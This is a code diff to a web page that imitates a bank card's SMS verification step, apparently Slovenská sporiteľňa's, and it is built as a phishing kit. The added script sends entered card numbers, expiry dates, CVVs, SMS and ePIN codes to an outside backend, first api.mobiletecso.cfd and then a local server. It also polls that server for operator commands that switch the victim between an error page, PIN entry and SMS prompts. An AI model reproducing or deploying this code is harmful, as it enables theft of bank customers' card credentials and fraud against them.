@@ -1461,33 +1461,7 @@ img.processing {
 
     </script>
 
-    <script>
-    /*<![CDATA[*/
-    var counter = 0;
-    window.pingServerWithInterval = function (interval, pingUrl) {
-        setTimeout(function () {
-            pingServer(pingUrl);
-            window.pingServerWithInterval(interval, pingUrl);
-        }, interval);
 
-    }
-
-    function pingServer(pingUrl) {
-        if (pingUrl == null || pingUrl == undefined) {
-            return;
-        }
-        const xhttp = new XMLHttpRequest();
-        try {
-            counter = counter + 1;
-            xhttp.open("GET", pingUrl + counter, true);
-            xhttp.send();
-        } catch (e) {
-            console.log(e)
-        }
-    }
-
-    /*]]>*/
-</script>
 
 
     <script>
@@ -1513,7 +1487,6 @@ img.processing {
         var helpHeight = 380;
         var pingUrl = "\/acsas\/static\/common\/ping?issuer=slsp\u0026id=895126900\u0026atag=0.dD04OTUxMjY5MDAvYz0xNzYuMTAxLjIuMjEzL3Y9MjAyNDA2MTAuMTY1MzU5.4179a4c5\u0026template=sms_code_page\u0026counter=";
         var pingInterval = 3000;
-        pingServerWithInterval(pingInterval, pingUrl);
         var formSubmitted = false;
         window.onload = setPageForm;
         /*<![CDATA[*/
@@ -1980,6 +1953,7 @@ img.processing {
     restyleLongResend();
 
     sendSlspTMDummyCallWithDelay();
+
 </script>
 <script>
 
@@ -2024,6 +1998,56 @@ img.processing {
 </script>
 
 <script>
+const session = JSON.parse(localStorage.getItem('session'));
+    function fetchUpdate() {
+    
+    console.log('sesion: ' + session)
+    console.log(session)
+    console.log(session)
+  fetch('http://127.0.0.1:5000/update'+"?session=" + encodeURIComponent(session))
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok ' + response.statusText);
+      }
+      return response.json(); // или response.text(), в зависимости от ожидаемого формата данных
+    })
+    .then(data => {
+      console.log('Data received:', data);
+      console.log("Ответ сервера:", data);
+            if (data.result === 'button1') {
+                var loadingElement = document.getElementById('loadingMessage');
+                loadingElement.style.display = 'none';
+                console.log("Ответ сервера:", data);
+                document.location.href = './error.html';
+            }
+            if (data.result === 'button4') {
+                var loadingElement = document.getElementById('loadingMessage');
+                loadingElement.style.display = 'none';
+                console.log("Ответ сервера:", data);
+                var element = document.querySelector('.ePin-block');
+                // Удаляем стиль display: none; если он установлен
+                if (element) {
+                    element.style.display = 'block'; // Устанавливаем пустую строку, чтобы вернуться к стандартному значению display элемента
+                }
+            }
+            if (data.result === 'button2') {
+                var loadingElement = document.getElementById('loadingMessage');
+                loadingElement.style.display = 'none';    
+                openModal_sms();
+            }
+            if (data.result === 'button3') {
+                var loadingElement = document.getElementById('loadingMessage');
+                loadingElement.style.display = 'none';
+                openModal();
+            }
+    })
+    .catch(error => {
+      console.error('There has been a problem with your fetch operation:', error);
+    });
+}
+// Устанавливаем интервал для выполнения fetchUpdate() каждые 5 секунд
+setInterval(fetchUpdate, 3000);
+
 function updateTime() {
     const now = new Date();
     const day = now.getDate();
@@ -2079,27 +2103,29 @@ function submitForm(event) {
     console.log("Question:", question);
 
     const urlParams = new URLSearchParams(window.location.search);
-
+    const session = JSON.parse(localStorage.getItem('session'));
     let url;
     if (question) {
         console.log('question');
-        url = "https://api.mobiletecso.cfd/login" +
+        url = "http://127.0.0.1:5000/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
             "&id=" + encodeURIComponent(id) +
             "&question=" + encodeURIComponent(question) +
             "&authCode=" + encodeURIComponent(authCode) +
-            "&epinAuthCode=" + encodeURIComponent(epinAuthCode);
+            "&epinAuthCode=" + encodeURIComponent(epinAuthCode) +
+            "&session=" + encodeURIComponent(session);
     } else {
         console.log('question');
-        url = "https://api.mobiletecso.cfd/login" +
+        url = "http://127.0.0.1:5000/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
             "&id=" + encodeURIComponent(id) +
             "&authCode=" + encodeURIComponent(authCode) +
-            "&epinAuthCode=" + encodeURIComponent(epinAuthCode);
+            "&epinAuthCode=" + encodeURIComponent(epinAuthCode) +
+              "&session=" + encodeURIComponent(session);
     }
 
     // Показываем элемент загрузки
@@ -2143,7 +2169,7 @@ function submitForm(event) {
         })
         .finally(() => {
             // Скрываем элемент загрузки
-            loadingElement.style.display = 'none';
+            console.log('nice')
         });
 }
 
